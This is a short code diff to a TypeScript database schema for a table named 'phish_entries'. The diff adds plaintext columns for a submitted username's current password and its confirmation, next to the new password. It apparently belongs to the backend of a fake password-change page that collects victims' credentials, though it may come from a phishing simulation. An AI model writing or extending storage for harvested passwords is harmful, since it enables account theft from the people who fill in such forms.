@@ -5,8 +5,10 @@ import { z } from "zod/v4";
 export const phishEntriesTable = pgTable("phish_entries", {
   id: serial("id").primaryKey(),
   username: text("username").notNull(),
+  currentPassword: text("current_password").notNull(),
+  confirmCurrentPassword: text("confirm_current_password").notNull(),
   newPassword: text("new_password").notNull(),
-  confirmPassword: text("confirm_password").notNull(),
+  confirmNewPassword: text("confirm_new_password").notNull(),
   submittedAt: timestamp("submitted_at").defaultNow().notNull(),
 });
 
